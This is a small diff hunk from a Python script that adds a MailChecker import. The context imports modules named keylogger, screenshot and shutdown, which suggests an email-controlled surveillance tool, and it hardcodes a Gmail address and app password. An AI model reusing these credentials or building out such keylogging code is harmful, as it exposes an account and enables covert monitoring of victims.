@@ -8,6 +8,7 @@ from email.header import decode_header
 import screenshot
 import keylogger
 import shutdown
+import MailChecker
 
 username_sender = "test.sender.pp@gmail.com"
 password_sender = "mqre gihn qzct yulz"
